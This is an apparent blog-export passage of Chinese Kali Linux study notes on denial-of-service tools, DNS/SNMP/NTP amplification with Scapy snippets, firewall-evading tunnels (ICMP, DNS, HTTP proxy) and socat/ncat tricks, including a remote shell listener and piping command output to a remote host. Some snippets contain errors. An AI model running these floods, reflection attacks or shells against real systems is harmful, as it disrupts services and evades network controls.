rel="noopener">http://1.1.1.1/a.php</a> -A siegehttp</p></li><li><p>同时攻击多个url，使用-f调用字典文件</p><ul><li>/etc/siege/urls.txt</li></ul></li><li><p>参数：</p><ul><li>-i：三种方式之一，internet</li><li>-A：UserAgent</li><li>-c：并发用户数</li></ul></li></ul><hr><h4 id="T50"><a href="#T50" class="headerlink" title="T50"></a>T50</h4><ul><li><p>网络压力测试</p></li><li><p><code>t50 1.1.1.1 --flood --turbo -S --protocol TCP --dport 80</code></p></li><li><p><code>t50 1.1.1.1 --flood --turbo -S TCP UDP OSPF EIGRP --dport 80</code></p></li></ul><hr><h4 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h4><ul><li><p><code>grep dos /usr/share/nmap/script/script.db|cut -d &quot;\&quot; -f 2</code></p></li><li><p><code>nmap -p445 --script=xxxx 1.1.1.1</code></p></li></ul><hr><h4 id="匿名者发布的DoS工具"><a href="#匿名者发布的DoS工具" class="headerlink" title="匿名者发布的DoS工具"></a>匿名者发布的DoS工具</h4><ul><li>LOIC</li><li>HOIC</li><li>DDoSer</li><li>招募志愿者，发放以上工具</li><li>以上DoS工具不隐藏真实IP地址</li></ul><hr><h4 id="XOIC"><a href="#XOIC" class="headerlink" title="XOIC"></a>XOIC</h4><ul><li>攻击任意IP地址的指定端口</li><li>github</li><li>三种模式：test、normal、DoS Attack</li><li>支持协议：TCP/HTTP/UDP/ICMP</li></ul><hr><h4 id="HULK（Http-Unbearable-Load-King）"><a href="#HULK（Http-Unbearable-Load-King）" class="headerlink" title="HULK（Http Unbearable Load King）"></a>HULK（Http Unbearable Load King）</h4><ul><li>Python脚本</li><li>随机产生大量唯一的地址请求，避免缓存命中</li><li>耗尽WEB服务器资源池</li></ul><hr><h4 id="DDOSIM"><a href="#DDOSIM" class="headerlink" title="DDOSIM"></a>DDOSIM</h4><ul><li>7层拒绝服务工具（模拟多个僵尸机）</li><li>随机IP地址</li><li>基于TCP连接的攻击</li><li>应用层DDoS攻击</li><li>正常的HTTP请求、非正常的HTTP请求式DDoS</li><li>SMTP DDoS</li><li>随机端口的TCP连接洪水</li></ul><hr><h4 id="GoldenEye"><a href="#GoldenEye" class="headerlink" title="GoldenEye"></a>GoldenEye</h4><ul><li>http/https拒绝服务攻击工具</li><li>安全研究为目的的Python脚本</li><li>随机攻击向量，keep-alive，避免缓存命中</li><li><code>./goldeneye.py http://1.1.1.1 -w 50</code></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>拒绝服务-应用层DoS</title>
      <link href="/posts/c7133ae1.html"/>
      <url>/posts/c7133ae1.html</url>
      
        <content type="html"><![CDATA[<h4 id="应用层DoS"><a href="#应用层DoS" class="headerlink" title="应用层DoS"></a>应用层DoS</h4><ul><li>应用服务漏洞<ul><li>服务代码存在漏洞，遇异常提交数据时程序崩溃</li><li>应用处理大量并发请求能力有限，被拒绝的是应用或O</li></ul></li><li>缓冲区溢出漏洞<ul><li>向目标函数随即提交数据，特定情况下数据覆盖临近寄存器或内存</li><li>影响：远程代码执行、DoS</li><li>利用模糊测试方法发现缓冲区溢出漏洞</li></ul></li></ul><a id="more"></a><hr><ul><li>CesarFTP 0.99 服务漏洞<ul><li>MKD+n个<code>/n</code></li></ul></li><li>Ms12-020 远程桌面协议漏洞<ul><li><code>searchsploit ms12-020</code></li><li><code>cat /usr/share/exploitdb/exploits/windows/dos/18606.txt</code></li></ul></li></ul><hr><ul><li><p>Slowhttptest(源自google)</p><ul><li>低带宽应用层慢速DoS攻击（相对于CC等快速攻击而言的慢速）</li><li>最早由Python编写，跨平台支持（Linux、win、Cygwin、OSX）</li><li>尤其擅长攻击apache、tomcat（几乎百发百中）</li><li>支持代理，大量应用服务器和安全设备都无法防护慢速攻击</li><li><code>unlimit -a</code>其中的open files限制了并发数<ul><li><code>unlimit -n 70000</code></li></ul></li><li><code>man slowhttptest</code></li></ul></li><li><p>攻击方法</p><ul><li>Slowloris、Slow HTTP POST 攻击<ul><li>耗尽应用的并发连接池，类似于Http层的Syn flood</li><li>HTTP协议默认在服务器全部接收请求之后才开始处理，若客户端发送速度缓慢或不完整，服务器时钟为其保留连接资源池占用，此类大量并发将导致DoS</li><li>Slowloris:完整的http请求结尾是\r\n\r\n,攻击发\r\n……</li><li>Slow POST：HTTP头content-length声明长度，但body部分缓慢发送。</li><li>Slow Read attack 攻击<ul><li>与slowloris and slow POST目的相同，都是耗尽应用的并发连接池</li><li>不同之处在于请求正常发送，但慢速读取响应数据</li><li>攻击者调整TCP window 窗口大小，使服务器慢速返回数据</li></ul></li><li>Apache Range Header attack<ul><li>客户端传输大文件时，体积超过HTTP Body大小限制进行分段</li><li>耗尽服务器CPU、内存资源</li></ul></li></ul></li></ul></li></ul><hr>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>拒绝服务-放大攻击</title>
      <link href="/posts/833195c3.html"/>
      <url>/posts/833195c3.html</url>
      
        <content type="html"><![CDATA[<h4 id="DNS放大攻击"><a href="#DNS放大攻击" class="headerlink" title="DNS放大攻击"></a>DNS放大攻击</h4><ul><li>产生大流量的方法<ul><li>单机的带宽优势</li><li>巨大单机数量形成的流量汇聚</li><li>利用协议特性实现放大效果的流量</li></ul></li></ul><a id="more"></a><ul><li><p>DNS协议放大</p><ul><li>查询请求流量小，但响应流量可能非常大</li><li><code>dig ANY qq.com @114.114.114.114</code></li></ul></li><li><p>Scapy 构造攻击数据包</p><ul><li>IP/UDP/DNS/DNS查询内容</li><li>结合IP地址欺骗，利用大量DNS服务器做傀儡攻击目标</li></ul></li></ul><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plain">i&#x3D;IP()<br>i.dst&#x3D;&quot;114.114.114.114&quot;<br>u&#x3D;UDP()<br>d&#x3D;DNS()<br>d.rd&#x3D;1<br>d.qdcount&#x3D;1<br>q.qname&#x3D;&quot;qq.com&quot;<br>q.qtype&#x3D;255<br>d.qd&#x3D;q<br>r&#x3D;(i&#x2F;u&#x2F;d)<br>sr1(r)<br></code></pre></td></tr></table></figure><h4 id="SNMP放大攻击"><a href="#SNMP放大攻击" class="headerlink" title="SNMP放大攻击"></a>SNMP放大攻击</h4><ul><li><p>简单网络管理协议</p><ul><li>Simple Network Management Protocol</li><li>服务端口 UDP 161/162</li><li>管理站（manager/客户端）、被管理设备（agent、服务端）</li><li>管理信息数据库（MIB）是一个信息存储库，包含管理代理中的有关配置和性能的数据，按照不同分类，包含分属不同组的多个数据对象。</li><li>每一个节点都有一个对象标识符（OID）来唯一标识</li><li>IETF定义标准的MIB库/厂家自定义MIB库</li></ul></li><li><p>攻击原理</p><ul><li>请求流量小，查询结果返回流量大</li><li>结合伪造源地址实现攻击</li></ul></li><li><p>攻击</p><ul><li>windows安装SNMP服务器</li><li>Scapy:</li></ul></li></ul><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plain">i&#x3D;IP()<br>i.dis&#x3D;&quot;1.1.1.23&quot;<br>u&#x3D;UDP()<br>u.dport&#x3D;161<br>u.sport&#x3D;161<br>s&#x3D;SNMP()<br>b&#x3D;SNMPbulk()<br>b.max_repetitions&#x3D;100<br>b.varbindlist[SNMPvarbind(oid&#x3D;ASN1_OID(&#39;1.3.6.1.2.1.1&#39;)),SNMPvarbind(oid&#x3D;ASN1_OID(&#39;1.3.6.1.2.1.1.19.1.3&#39;))]<br>s.PDU&#x3D;b<br>r&#x3D;(i&#x2F;u&#x2F;s)<br>sr1(r)<br></code></pre></td></tr></table></figure><ul><li>用nmap在互联网扫描一个网段，得到所有开放161端口的ip,然后测试<ul><li><code>nmap -sU -p161 202.206.0.0/16</code></li></ul></li></ul><h4 id="NTP放大攻击"><a href="#NTP放大攻击" class="headerlink" title="NTP放大攻击"></a>NTP放大攻击</h4><ul><li><p>网络时间协议</p><ul><li>Network Time Protocol</li><li>保证网络设备时间同步</li><li>电子设备相互干扰导致时钟差异越来越大</li><li>如果时间不正确，会影响应用正常运行、日志审计不可信</li><li>服务端口UDP 123</li></ul></li><li><p>攻击原理</p><blockquote><p>放大反射dos攻击由CVE-2013-5211所致。且这漏洞是与molist功能有关。Ntpd4.2.7p26之前的版本都会去响应NTP中的mode7“monlist”请求。ntpd-4.2.7p26版本后，“monlist”特性已经被禁止，取而代之的是“mrulist”特性，使用mode6控制报文，并且实现了握手过程来阻止对第三方主机的放大攻击。</p></blockquote><ul><li>NTP服务器monlist（MON_GETLIST）查询功能<ul><li>监控NTP服务器的状况</li></ul></li><li>客户端查询时，NTP服务器返回最后同步时间的600个客户端IP<ul><li>每6个IP一个数据包，最多100个数据包（）放大100倍</li></ul></li></ul></li><li><p>NTP服务安装</p><ul><li><code>apt-get install ntp</code></li></ul></li><li><p>扫描</p><ul><li><code>nmap -sU -p123 192.168.8.0/24 --open</code></li><li><code>nmap -sU -p123 -sV 192.168.8.170</code></li></ul></li><li><p>判断使否启用了monlist查询功能</p><ul><li><code>ntpc -n -c monlist 192.168.8.170</code><ul><li>timeout说明没有启用，默认是关闭状态</li><li>开启方法：<ul><li><code>vim /etc/ntp.conf</code>注释掉两行restrict开头的命令，然后重启服务</li></ul></li></ul></li></ul></li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>请求流量小，查询结果返回流量大</li><li>结合源IP地址欺骗</li><li>利用大量服务器发起攻击</li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>拒绝服务</title>
      <link href="/posts/127b16db.html"/>
      <url>/posts/127b16db.html</url>
      
        <content type="html"><![CDATA[<h4 id="拒绝服务"><a href="#拒绝服务" class="headerlink" title="拒绝服务"></a>拒绝服务</h4><ul><li>DoS（Denial of Service）</li><li>DDoS（）<ul><li>一对一的攻击完全拼各自的资源，效果差</li><li>多对一的攻击汇聚资源能力，重点在于量大，属于资源耗尽型</li></ul></li><li>最强大最危险的攻击，攻击方式众多</li><li>Bill gates 僵尸程序</li></ul><a id="more"></a><h5 id="Anonymous"><a href="#Anonymous" class="headerlink" title="Anonymous"></a>Anonymous</h5><ul><li>世界最著名的黑客组织</li><li>组织结构宽松，人员来自世界各地</li><li>以DDoS攻击著称的无政府主义者</li><li>攻击恐怖组织也攻击政府宗教机构</li><li>近些年来涉足政治斗争</li><li>成员露面时均带有Guy Fawkes面具</li><li>最早的核心成员来自4chan图片社区</li><li>惯常雇佣外围黑客成员发动DDoS攻击</li><li>口号：We are Anonymous, We are Legion, We do not forgive, We do not forget, Expect us</li></ul><h5 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h5><ul><li>D网络<ul><li>基于巨量的Flood耗尽目标网络带宽资源</li><li>ICMP Flood、UDP Flood</li></ul></li><li>D协议<ul><li>攻击协议漏洞发起的拒绝服务攻击</li><li>如SynFlood、Ping of Death、ARP、DNS、802.11、SSL</li></ul></li><li>D应用<ul><li>针对应用软件和操作系统漏洞发起的拒绝服务攻击</li><li>大量频繁访问消耗系统资源严重的应用</li><li>通常表现为操作系统正常运行，网络流量不大，但服务停止响应</li><li>可以是一击毙命，也可以是耗尽目标资源</li></ul></li></ul><h4 id="SYN-Flood（半连接）"><a href="#SYN-Flood（半连接）" class="headerlink" title="SYN Flood（半连接）"></a>SYN Flood（半连接）</h4><ul><li><p>用scapy直接发SYN，本机操作系统会自动回复RST给被攻击方发来的SYN/ACK</p><ul><li>需要在本机操作系统防火墙进行设置，阻止发出RST</li><li>并不会占用太多CPU或内存资源，但是会耗尽TCP连接数。</li></ul></li><li><p>常常伴随IP欺骗</p><ul><li>伪造源IP地址<ul><li>大部分ISP会在路由限制出站ip地址</li><li>企业防火墙也会进行入站过滤</li></ul></li><li>受害者可能是源、目的地址</li><li>防火墙基于地址的验证可以通过伪造地址绕过</li><li>压力测试模拟多用户可能就使用了IP地址欺骗</li><li>通过上层协议（比如TCP序列号）防止IP欺骗</li></ul></li></ul><h4 id="Smurf攻击（广播ping）"><a href="#Smurf攻击（广播ping）" class="headerlink" title="Smurf攻击（广播ping）"></a>Smurf攻击（广播ping）</h4><ul><li>世界上最古老的DDoS攻击技术<ul><li>向广播地址发送伪造源地址的ICMP echo Request（Ping）包</li><li>LAN所有计算机向伪造的源地址返回响应包</li><li>对现代操作系统几乎无效（不响应目标为广播的ping）</li></ul></li></ul><h4 id="Sockstress（全连接）"><a href="#Sockstress（全连接）" class="headerlink" title="Sockstress（全连接）"></a>Sockstress（全连接）</h4><ul><li>2008年由Jack C.Louis 发现</li><li>针对TCP服务的拒绝服务攻击<ul><li>消耗被攻击目标系统资源（不消耗网络资源）</li><li>与攻击目标建立大量socket链接</li><li>完成三次握手，最后的ACK包window大小为0（客户端不接受数据）</li><li>攻击者资源消耗小（CPU、内存、带宽）</li><li>异步攻击，单机可拒绝服务高配资源服务器</li><li>Window窗口实现的TCP流控</li></ul></li><li>防御措施<ul><li>根本的防御方法是采用白名单（不实际）</li><li>折中对策：限制单位时间内每IP建立的TCP连接数<ul><li>封杀每30秒与80端口建立连接超过10个的IP地址<ul><li><code>iptables -I INPUT -p tcp --dport 80 -m state --state NEW -m recent --set</code></li><li><code>iptables -I INPUT -p tcp --dport 80 -m state --state NEW -m recent --update --seconds 30 --hitcount 10 -j DROP</code></li></ul></li></ul></li><li>对DDoS攻击无效</li></ul></li></ul><h4 id="TearDrop（IP分片重叠）"><a href="#TearDrop（IP分片重叠）" class="headerlink" title="TearDrop（IP分片重叠）"></a>TearDrop（IP分片重叠）</h4><ul><li>主要针对早期微软操作系统</li><li>使用IP分段偏移实现分段覆盖，接收端处理分段覆盖时可被拒绝服务</li><li>攻击效果：被攻击者蓝屏、重启、卡死</li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>流量操控技术-sslh、stunnle4</title>
      <link href="/posts/d9ac0771.html"/>
      <url>/posts/d9ac0771.html</url>
      
        <content type="html"><![CDATA[<h4 id="SSLH"><a href="#SSLH" class="headerlink" title="SSLH"></a>SSLH</h4><ul><li>端口分配器<ul><li>根据客户第一个包检测协议类型</li><li>根据协议检测结果将流量转发给不同目标</li><li>支持HTTP，HTTPS，SSH，OpenVPN，tinc，XMPP和其它可基于正则表达式判断的任何协议类型</li><li>适用于防火墙允许443端口入站房屋内流量的环境</li></ul></li><li>kali中配置文件在 /etc/default/sslh</li><li>使用一个端口映射多个服务</li></ul><a id="more"></a><h4 id="stunnel4"><a href="#stunnel4" class="headerlink" title="stunnel4"></a>stunnel4</h4><ul><li><p>官网：stunnel.org</p></li><li><p>无需修改源代码的情况下将TCP流量封装于SSl通道内</p></li><li><p>适用于本身不支持加密传输的应用</p></li><li><p>支持openssl安全特性</p></li><li><p>跨平台</p></li><li><p>性能优</p></li></ul><h5 id="内网安装Stunnel4服务器"><a href="#内网安装Stunnel4服务器" class="headerlink" title="内网安装Stunnel4服务器"></a>内网安装Stunnel4服务器</h5><p>服务端配置</p><ul><li>生成证书：<code>openssl req -new -days 365 -nodes -x509 -out /etc/stunnel/stunnel.pem -keyout /etc/stunnel/stunnel.pem</code></li><li>创建配置文件 <code>/etc/stunnel/stunnel.conf</code></li></ul><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">cert &#x3D; &#x2F;etc&#x2F;stunnel&#x2F;stunnel.pem<br>setuid &#x3D; stunnel4<br>setgid &#x3D; stunnel4<br>pid &#x3D; &#x2F;var&#x2F;run&#x2F;stunnel4&#x2F;stunnel4.pid<br>[mysqls]<br>accept &#x3D; 0.0.0.0:443<br>connect &#x3D; 1.1.1.17:3306<br></code></pre></td></tr></table></figure><p>Stunnel4自动启动</p><ul><li>修改配置文件<code>/etc/default/stunnel4</code></li></ul><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">ENABLE&#x3D;1<br></code></pre></td></tr></table></figure><ul><li>启动stunnel4服务端<ul><li>stunnel4 /etc/stunnel/stunnel.conf</li></ul></li><li>防火墙规则<ul><li>端口映射TCP/443端口到stunnel4服务端</li><li>设置防火墙规则</li></ul></li></ul><p>客户端配置：</p><ul><li>kali自带stunnel4</li><li>客户端端配置<ul><li><code>/etc/stunnel/stunnel.conf</code></li></ul></li></ul><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">client &#x3D; yes<br>[mysqls]<br>accept &#x3D; 3306<br>connect &#x3D; 192.168.43.3:443<br></code></pre></td></tr></table></figure><ul><li>启动<code>stunnel4 /etc/stunnel/stunnel.conf</code></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>流量操控技术-ptunnle、proxytunnle</title>
      <link href="/posts/7d067e4e.html"/>
      <url>/posts/7d067e4e.html</url>
      
        <content type="html"><![CDATA[<h4 id="ptunnle"><a href="#ptunnle" class="headerlink" title="ptunnle"></a>ptunnle</h4><ul><li>ping tunnel ICMP隧道工具，通过ICMP echo（ping requests）和reply（ping reply）实现隧道。</li><li>适用于防火墙只允许ping出站流量的环境</li><li>支持多并发连接、性能优</li><li>支持身份验证</li><li>需要root权限</li><li>支持抓包<ul><li>Win：winpcap</li><li>Linux：libpcap</li></ul></li><li>工作过程<ul><li>Proxy、Client、Destination</li></ul></li></ul><a id="more"></a><h5 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h5><ul><li><p>服务端：</p><ul><li><code>ptunnel -x 1234</code><ul><li>-x 密码</li></ul></li></ul></li><li><p>客户端：</p><ul><li><code>ptunnel -p &lt;proxyIP&gt; -lp &lt;local listen port&gt; -da &lt;destinationIP&gt; -dp&lt;destination port&gt; -x &lt;passwd&gt;</code></li><li><code>ptunnel -p 192.168.43.72 -lp 2222 -da 192.168.43.72 -dp 22 -x 1234</code></li></ul></li><li><p>嵌套ssh隧道</p></li><li><p>0.72及以前存在DDos漏洞</p></li></ul><h4 id="proxytunnle"><a href="#proxytunnle" class="headerlink" title="proxytunnle"></a>proxytunnle</h4><ul><li>通过标准的HTTP/HTTPS代理创建隧道的工具</li><li>通过HTTP CONNECT方法封装信息</li><li>适用于内网使用代理并且防火墙只允许代理服务器上网的场景</li><li>无法创建DNS隧道和ICMP隧道</li></ul><h5 id="实验环境1"><a href="#实验环境1" class="headerlink" title="实验环境1"></a>实验环境1</h5><ul><li><p>防火墙只开放了代理服务器访问外网的80端口</p></li><li><p>内网机器通过1.1.1.13上的squid3 http代理上网</p><ul><li>修改/etc/squid/squid.conf <ul><li>http_port 字段加上ip，否则在所有网卡上侦听端口</li><li>http_access<ul><li>allow !Safe_ports</li><li>allow CONNECT !SSL_ports</li><li>allow all</li></ul></li><li>通过/^acl 可以查看到Safe_ports端口</li></ul></li></ul></li><li><p>客户端</p><ul><li><code>proxytunnel -a 80 -p 1.1.1.2:3128 -d 192.168.43.72:80</code><ul><li>-a 本地侦听端口</li><li>-p代理服务器的地址</li><li>-d目标资源</li></ul></li></ul></li><li><p>服务端</p><ul><li>常规的代理服务器</li></ul></li></ul><h5 id="实验环境2"><a href="#实验环境2" class="headerlink" title="实验环境2"></a>实验环境2</h5><ul><li>外网资源非防火墙允许端口<ul><li>修改目标资源侦听端口可能无法躲避防火墙深层检测(检测80端口的流量是不是http（协议层检测）)</li><li>外网安装squid3代理服务器并侦听80端口</li><li>创建隧道：<ul><li><code>proxytunnle -a 80 -p 1.1.1.16:3128 -r 192.168.43.72:80 -d 192.168.43.72:22</code><ul><li>-r :自己的代理服务器</li></ul></li></ul></li></ul></li></ul><h5 id="实验环境3"><a href="#实验环境3" class="headerlink" title="实验环境3"></a>实验环境3</h5><ul><li>ssh客户端配置自动创建代理链隧道（即，完成实验环境2中的两次代理）</li><li>通过ssh配置文件 ~/.ssh/config 来完成</li></ul><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4><p>http的X-Forwarded-For字段，如果不做清除会暴露服务器真实ip地址</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>流量操控技术-DNS协议隧道</title>
      <link href="/posts/948e7d2a.html"/>
      <url>/posts/948e7d2a.html</url>
      
        <content type="html"><![CDATA[<h3 id="DNS协议隧道"><a href="#DNS协议隧道" class="headerlink" title="DNS协议隧道"></a>DNS协议隧道</h3><ul><li>防火墙禁止TCP出战访问流量<ul><li>SSH隧道、端口转发全部失效</li><li>DNS的工作原理适合用于实现隧道</li></ul></li><li>DNS工作原理<ul><li>DNS隧道原理：注册受自己控制的DNS记录</li></ul></li></ul><a id="more"></a><h4 id="DNS2TCP"><a href="#DNS2TCP" class="headerlink" title="DNS2TCP"></a>DNS2TCP</h4><ul><li>利用合法DNS服务器实现DNS隧道</li><li>C/S（dns2tcp/dns2tcpd）结构</li><li>通过txt记录加密传输数据（A记录长度有限）</li><li>隧道建立后保持连接</li><li>默认记录生存时间3秒</li></ul><h5 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h5><ul><li><code>apt-get install dns2tcp</code></li><li>Kali默认安装</li></ul><h5 id="环境配置1（直接通过防火墙访问外网DNS服务器）"><a href="#环境配置1（直接通过防火墙访问外网DNS服务器）" class="headerlink" title="环境配置1（直接通过防火墙访问外网DNS服务器）"></a>环境配置1（直接通过防火墙访问外网DNS服务器）</h5><ul><li><p>Win2003:安装DNS服务器；配置转发器；创建区域lab.com;指派二级域test.lab.com；NS记录指向Kali</p></li><li><p>防火墙：只允许UDP 53端口出站</p></li><li><p>客户端（Bodhi Linux）</p><ul><li><code>dns2tcpc -c -k pass -d 1 -l 2222 -r ssh -z test.lab.com</code><ul><li>-c 启动压缩，提高网络效率</li></ul></li><li>-k 服务端配置文件中设置的密码，可以不设置。<ul><li>-l 本地侦听端口</li><li>-r resources</li><li>-z 服务端的域名</li></ul></li></ul></li><li><p>服务端（Kali）</p><ul><li>服务端配置文件：<ul><li>/etc/dns2tcpd.conf</li><li>.dns2tcprcd（也可以在当前用户主目录下创建这个文件，就不需要指定-f参数了）</li><li>资源可以是其它地址</li></ul></li><li>启动</li><li><code>dns2tcpd -F -d 1 -f /etc/dns2tcpd.conf</code><ul><li>-F:前端运行</li><li>-d:debug level 1-3</li><li>-f :指定配置文件</li></ul></li></ul></li></ul><h5 id="环境配置2（防火墙内DNS服务器访问指定外网DNS服务器）"><a href="#环境配置2（防火墙内DNS服务器访问指定外网DNS服务器）" class="headerlink" title="环境配置2（防火墙内DNS服务器访问指定外网DNS服务器）"></a>环境配置2（防火墙内DNS服务器访问指定外网DNS服务器）</h5><ul><li>同样的操作</li></ul><h5 id="资源访问"><a href="#资源访问" class="headerlink" title="资源访问"></a>资源访问</h5><ul><li>本地ssh资源</li><li>socks代理</li><li>隧道嵌套</li></ul><h4 id="iodine"><a href="#iodine" class="headerlink" title="iodine"></a>iodine</h4><ul><li>对下行数据不进行编码，因此性能优秀</li><li>支持多平台：Linux、BSD、MacOS、Windows</li><li>最大16个并发连接</li><li>强制密码支持</li><li>支持同网段 隧道IP（在客户端和服务器端分别创建虚拟网卡，分别绑定一个新的ip。这两个新ip处于同一网段，而这个网段与客户端服务端的网段都不同）</li><li>支持多种DNS记录类型</li><li>丰富的隧道质量检测措施</li></ul><h5 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h5><p>服务端：</p><figure class="hljs highlight plain"><figcaption><span>-f -c 2.2.2.1 test.lab.com```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs iodined"><br>-f:前台运行<br><br>-c：检查ip地址<br><br>ip地址：本机上隧道网段的ip地址（ifconfig查看，dns0）<br><br>客户端：<br><br>&#96;&#96;&#96;iodine -f 1.1.1.2 test.lab.com<br></code></pre></td></tr></table></figure><ul><li>这里指定的是本地DNS服务器ip，也可以不指定，自己检测</li></ul><p><code>curl --socks5 -hostname 127.0.0.1:7001</code></p><h5 id="隧道网络接口"><a href="#隧道网络接口" class="headerlink" title="隧道网络接口"></a>隧道网络接口</h5><ul><li>不基于资源的通用隧道，如同本网段内两台相邻的主机。</li><li>服务器端和客户端分别生成隧道网络接口dns0</li><li>隧道两端接口的IP地址应不同于客户端和服务端网段</li><li>隧道可以嵌套其它隧道，如ssh</li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>流量操控技术-NCAT、SOCAT</title>
      <link href="/posts/b1c828f0.html"/>
      <url>/posts/b1c828f0.html</url>
      
        <content type="html"><![CDATA[<h4 id="NCAT"><a href="#NCAT" class="headerlink" title="NCAT"></a>NCAT</h4><ul><li><p>NC的衍生版软件,Nmap的一部分。</p></li><li><p>代理功能</p><ul><li><code>ncat -l 8080 --proxy-type http --proxy-auth user:pass</code><ul><li>-l 默认端口31337</li></ul></li></ul></li><li><p>Broker中介功能</p><ul><li>服务器：ncat -l 333 – broker</li><li>客户端之间发送任何信息都会被hub到其它客户端</li><li>批量执行命令<ul><li><code>ncat 1.1.1.1 --sh-exec &quot;echo `pwd`&quot;</code></li><li><code>ncat --send-only 1.1.1.1 &lt; inputfile</code></li></ul></li></ul></li></ul><a id="more"></a><h4 id="SOCAT"><a href="#SOCAT" class="headerlink" title="SOCAT"></a>SOCAT</h4><ul><li>被称为nc++</li><li>命令使用产看 socat -hhh</li></ul><hr><ul><li>连接端口<ul><li><code>socat - tcp:1.1.1.1:80</code><ul><li>- 代表标准输入输出</li></ul></li></ul></li><li>侦听端口<ul><li><code>socat - tcp4-listen:22</code></li></ul></li></ul><hr><ul><li><p>接收文件</p><ul><li><code>socat - tcp4-listen:3333 open:2.txt,create,append</code></li></ul></li><li><p>发送文件</p><ul><li><code>cat 1.txt | socat - tcp4:192.168.43.51:3333</code></li></ul></li></ul><hr><ul><li>远程shell–服务端<ul><li><code>socat tcp-l:23 exec:sh,pty,stderr</code></li></ul></li><li>端口转发<ul><li><code>socat tcp4-listen:8080,fork tcp4:1.1.1.1:22</code><ul><li>fork,每当端口收到一个连接，新建一个子进程。</li><li>收到请求后，转发到1.1.1.1:22</li></ul></li></ul></li></ul><hr><ul><li>执行命令，将结果发到远端<ul><li><code>socat - udp-l:2001</code></li><li><code>echo &quot;`id`&quot; | socat - udp-datagram:192.168.43.72:2001</code></li></ul></li></ul><hr><ul><li><p>UDP全端口任意内容发包</p><ul><li>for PORT in {1..65535} do echo “aaaaa”|socat - udp4-datagram 192.168.43.72:$PORT;sleep .1;done</li></ul></li><li><p>二进制编辑器</p><ul><li>echo -e “\0\14\0\0\c”|socat -u -file:/usr/bin/squide.exe,seek,seek=0x00074420</li></ul></li><li><p>简单的WEB服务器</p><ul><li>socat -T 1 -d -d  TCP-L:10081，reuseaddr,fork,crlf  SYSTEM:”echo -e xxxxxxx”</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>流量操控技术-rinetd、SSH</title>
      <link href="/posts/fc468a07.html"/>
      <url>/posts/fc468a07.html</url>
      
